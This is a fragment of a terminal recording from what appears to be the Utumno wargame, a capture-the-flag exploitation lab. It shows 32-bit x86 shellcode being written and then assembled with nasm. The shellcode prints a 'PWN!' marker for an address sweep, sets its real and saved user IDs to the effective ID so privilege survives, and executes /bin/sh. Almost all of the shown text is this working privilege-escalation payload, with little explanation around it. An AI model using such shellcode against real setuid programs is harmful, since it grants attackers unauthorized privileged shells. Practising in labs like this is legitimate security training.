[0.003, "o", "BITS 32\r\r\nglobal _start\r\r\n_start:\r\r\n    ; write(1, \"PWN!\", 4) -- marker so the address sweep can tell a hit from a crash\r\r\n    xor eax, eax\r\r\n    push eax\r\r\n    push 0x214e5750\r\r\n    mov ecx, esp\r\r\n    xor ebx, ebx\r\r\n    inc ebx\r\r\n    xor edx, edx\r\r\n    mov dl, 4\r\r\n    xor eax, eax\r\r\n    mov al, 4\r\r\n    int 0x80\r\r\n    ; euid = geteuid(); setreuid(euid,euid)\r\r\n    xor eax, eax\r\r\n    mov al, 201\r\r\n    int 0x80\r\r\n    mov ebx, eax\r\r\n    mov ecx, eax\r\r\n    xor eax, eax\r\r\n    mov al, 70\r\r\n    int 0x80\r\r\n    ; setuid(euid) -- real, effective AND saved, so the privilege survives execve\r\r\n    xor eax, eax\r\r\n    mov al, 201\r\r\n    int 0x80\r\r\n    mov ebx, eax\r\r\n    xor eax, eax\r\r\n    mov al, 23\r\r\n    int 0x80\r\r\n    ; execve(\"/bin/sh\", [\"/bin/sh\", NULL], NULL)\r\r\n    xor eax, eax\r\r\n    push eax\r\r\n    push 0x68732f2f\r\r\n    push 0x6e69622f\r\r\n    mov ebx, esp\r\r\n    push eax\r\r\n    push ebx\r\r\n    mov ecx, esp\r\r\n    xor edx, edx\r\r\n    mov al, 11\r\r\n    int 0x80\r\r\n\r\r\n\u001b]3008;end=3d82fd55-ab9f-433b-aa52-2a97a8f7d254;exit=success\u001b\\\u001b]3008;start=ffd8730a-49e2-4b4e-b486-6a93cd0caf30;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=utumno2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/uu2\u001b\\\u001b[?2004h\u001b]0;utumno2@utumno: /tmp/uu2\u0007utumno2@utumno:/tmp/uu2$ nasm -f elf32 sc.asm -o sc.o\r\r\n\u001b[?2004l\r\u001b]3008;start=937e3ff5-3fee-4474-bcad-c1d2c7372086;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=utumno2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/uu2\u001b\\\u001b]3008;end=937e3ff5-3fee-4474-bcad-c1d2c7372086;exit=success\u001b\\"]
